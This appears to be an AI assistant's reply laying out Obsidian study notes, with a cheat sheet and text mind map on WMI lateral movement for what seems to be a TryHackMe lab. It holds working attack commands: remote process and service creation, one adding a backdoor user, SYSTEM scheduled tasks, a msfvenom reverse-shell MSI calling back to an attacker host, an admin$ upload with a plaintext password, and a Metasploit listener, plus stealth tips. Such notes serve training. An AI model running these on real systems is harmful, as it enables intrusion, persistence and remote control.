Here you go — **all three versions** prepared cleanly for Obsidian.

---

# ✅ **1. SHORT CHEAT SHEET (SUPER CONDENSED)**

## **🔐 Create Credential & WMI Session**

```powershell
$username='Administrator'
$password='Pass123'
$cred = New-Object System.Management.Automation.PSCredential($username,(ConvertTo-SecureString $password -AsPlainText -Force))

$opt = New-CimSessionOption -Protocol DCOM
$Session = New-CimSession -ComputerName TARGET -Credential $cred -SessionOption $opt
```

---

## **▶️ Remote Process**

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
  CommandLine="cmd.exe /c calc.exe"
}
```

---

## **⚙️ Create Service**

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
  Name="THMService2"; DisplayName="THMService2";
  PathName="net user munra Pass123 /add";
  ServiceType=16; StartMode="Manual"
}
```

**Start / Stop / Delete**

```powershell
$svc = Get-CimInstance -CimSession $Session -ClassName Win32_Service -Filter "Name='THMService2'"
Invoke-CimMethod -InputObject $svc -MethodName StartService
Invoke-CimMethod -InputObject $svc -MethodName StopService
Invoke-CimMethod -InputObject $svc -MethodName Delete
```

---

## **⏰ Scheduled Task**

```powershell
$Action = New-ScheduledTaskAction -CimSession $Session -Execute "cmd.exe" -Argument "/c whoami > C:\out.txt"
Register-ScheduledTask -CimSession $Session -Action $Action -User "SYSTEM" -TaskName "THMtask"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask"
```

**Delete**

```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask"
```

---

## **📦 Install MSI**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
```

```bash
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```


```bash
 msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4445; exploit"
```

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
  PackageLocation="C:\Windows\payload.msi"; Options=""; AllUsers=$false
}
```

---

## **⚠️ Ports & Permissions**

- **Ports:** 135, 49152–65535 (RPC/DCOM), 5985/5986 (WinRM)
    
- **Requires Admin** on target
    
- **No output returned** (silent execution)
    

---

# ⚠️ **2. MIND MAP (TEXT VERSION)**

```
REMOTE EXECUTION & LATERAL MOVEMENT (WMI)
│
├── Credentials
│     └── PSCredential object
│
├── WMI Session
│     ├── DCOM (135, 49152–65535)
│     └── WSMan (5985/5986)
│
├── Techniques
│     │
│     ├── Remote Process Execution
│     │     └── Win32_Process → Method: Create
│     │
│     ├── Service Creation
│     │     ├── Win32_Service → Create
│     │     ├── StartService
│     │     ├── StopService
│     │     └── Delete
│     │
│     ├── Scheduled Tasks
│     │     ├── New-ScheduledTaskAction
│     │     ├── Register-ScheduledTask
│     │     ├── Start-ScheduledTask
│     │     └── Unregister-ScheduledTask
│     │
│     └── MSI Package Installation
│           └── Win32_Product → Install
│
├── Tools
│     ├── PowerShell (CIM/WMI)
│     └── Legacy: wmic.exe
│
└── Important Notes
      ├── Requires Administrator
      ├── Silent execution (no output)
      ├── Win32_Product = noisy (forces MSI reconfig)
      ├── Scheduled tasks = stealthier
      └── Logs appear in Event Viewer (Operational Logs)
```

---

